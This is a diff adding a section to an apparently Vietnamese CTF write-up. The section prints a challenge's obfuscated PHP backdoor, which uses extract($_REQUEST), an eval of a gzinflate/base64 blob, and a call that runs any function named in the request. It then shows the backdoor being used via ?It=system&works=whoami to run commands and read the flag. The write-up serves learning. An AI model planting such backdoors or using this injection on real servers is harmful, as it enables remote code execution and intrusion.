@@ -9,6 +9,7 @@
 - [Sun* Service](https://github.com/DucThinh47/VibloCTF-Writeups/tree/main#sun-service)
 - [Web13](https://github.com/DucThinh47/VibloCTF-Writeups#web13)
 - [Web6](https://github.com/DucThinh47/VibloCTF-Writeups#web6)
+- [phpinfo.php]()
 #### Web7
 
 ![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image0.png?raw=true)
@@ -338,7 +339,49 @@ Tôi sẽ dùng `Flask-unsign` để brute-force secret key:
 Tuy nhiên lại tìm được cả `s_username` và `s_password`, tôi login bằng thông tin này và tìm được flag:
 
 ![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image38.png?raw=true)
+#### phpinfo.php
 
+![img](39)
+
+Đoạn code được cung cấp:
+
+    <?php
+    phpinfo();
+
+    @extract($_REQUEST);
+
+    eval(
+        "\x65\x76\x61\x6C\x28" .
+        "\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65" .
+        "\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65" .
+        "\x28'TZFJk6JAFIT/S196JurQrAXEnNgVQQQFxPACxaIgNItgWb++6bEjZg4ZGZn5vdPL5+T26+2MIX/GAlycXqSeMSMuLiydvLi0SF8EX9s3I3Cvm78c89Oxr45dOHbZeWPJPxz83v7LjPiOT4qdcpZsrI8fVzynYRjA3mxgbKoPZ7P2T6tKJ4HccSVRabkoByDFh6wzJJpB7RaTuZsR62IHBNuZgl1JcXwIA6crMte17vbKubv1AUbebTUMw0g4kKaExOzUHG3bcOpuLPOmdQHKJxqQZGuxYHZVKKYMztppPnlRtMV4LPQE40qYR+gCg2VwYXdrObF63tTrq7bfirwrTmV1uwxqRa5Uu9IiREq5WBn38XEIS87JdPOxB3l/p0qJoJhXHBwbNq8EaZjxADLPmo20gF1rGvhMg8FJjcAikNa5vBOSW4P46UrbT4A+6qsyo/wo7KSc9wBXEM3qL+qI/F5IdNWlePNgMVCqPq2Gnjo/kTac3zoeB+lJlr1WdUsfPL0Y5UC0dpoW13QSbU6w9vwyfR6yhqb6xFRaFIYVDVDNy+b8idtaHp2yj9HFdVjW8htz3Y7QKbL9Pu2bqN9J4MTN78tHpX9ilbfff74A'" .
+        "\x29\x29\x29\x3B"
+    );
+
+    echo($It($works));
+    ?>
+
+Dựa vào đoạn code này, có thể thấy:
+- Biến `$It` và `$works` đều được lấy từ tham số request (GET hoặc POST) nhờ `extract($_REQUEST)`
+- Cuối cùng nó gọi hàm `$It($works)`
+
+=> `$It` phải là tên hàm có tồn tại trong PHP (ví dụ: system, assert, base64_decode,…) và `$works` là tham số truyền vào cho hàm đó.
+
+Tôi thử dùng `dirsearch` và tìm được URL `/phpinfo.php`:
+
+![img](40)
+
+Tiếp theo tôi thử truy cập `/phpinfo.php?It=system&works=whoami`:
+
+![img](41)
+
+=> Thành công thực hiện câu lệnh `whoami`. Tiếp theo tôi thử chèn lệnh `ls` và tìm được 1 file khả nghi:
+
+![img](42)
+
+Tiến hành đọc file này và tìm được flag:
+
+![img](43)
 
 
 
